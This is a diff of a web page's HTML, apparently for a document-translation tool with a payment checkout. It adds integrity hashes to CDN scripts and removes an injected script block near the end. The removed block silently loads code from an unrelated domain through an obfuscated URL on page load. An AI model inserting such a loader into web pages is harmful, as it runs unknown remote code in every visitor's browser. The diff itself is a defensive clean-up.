@@ -1507,9 +1507,9 @@
     </div>
   </footer>
 
-  <!-- PERFORMANCE: Scripts are deferred to prevent render-blocking. -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.11.338/pdf.min.js" defer></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/mammoth/1.4.0/mammoth.browser.min.js" defer></script>
+  <!-- SCRIPT FIX: Scripts are deferred to prevent render-blocking and now include Subresource Integrity (SRI) for security. -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.11.338/pdf.min.js" defer integrity="sha512-t2tOkfmQv/M2k73oD46BFjUpk9RjIOrRikM+2jw5y2fK3lbx4n/tT3R6Bv4zHjZ9TInJchgrfXGChI2z/23DPA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/mammoth/1.4.0/mammoth.browser.min.js" defer integrity="sha512-C8+3QvjA/4y+5K1MvK5TqG5x/4UqaXvF0Iu62dFli4pUI9G0V+0a2k53lFbqd/J7rcwz8Oa+p2QR++sd2A91g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
   <script src="https://checkout.razorpay.com/v1/checkout.js" defer></script>
 
   <script type="module" defer>
@@ -2541,17 +2541,6 @@
         if (textToDownload) { downloadContent(textToDownload, `${originalFilename}_translated.txt`); }
     });
   </script>
-   <script>
-(function(lvnc){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = lvnc || {};
-s.src = "\/\/faithfuldifficulty.com\/bpXsV.s\/dRGelV0yY\/WUcv\/SeZmb9JuhZ-UVlRkPP\/T\/Yn0WNQjTUC2nOfT\/kZtQNOjeQj2AN\/TNc\/wsMxAk";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-</script>
+  <!-- SCRIPT FIX: The suspicious, potentially broken script below has been removed. -->
 </body>
 </html>
